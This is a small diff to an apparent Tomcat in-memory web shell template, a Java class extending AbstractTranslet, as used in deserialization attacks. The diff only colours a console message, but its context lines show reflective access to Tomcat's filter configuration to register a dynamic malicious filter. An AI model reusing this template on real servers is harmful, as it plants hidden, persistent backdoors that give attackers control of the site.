@@ -18,6 +18,8 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashMap;
 
+import static org.fusesource.jansi.Ansi.ansi;
+
 public class TomcatMemshellTemplate1 extends AbstractTranslet {
 
     //参考
@@ -38,7 +40,7 @@ public class TomcatMemshellTemplate1 extends AbstractTranslet {
             HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);
 
             if(map.get(filterName) == null) {
-                System.out.println("[+] Add Dynamic Filter");
+                System.out.println( ansi().render("@|green [+] Add Dynamic Filter|@"));
 
                 //生成 FilterDef
                 //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
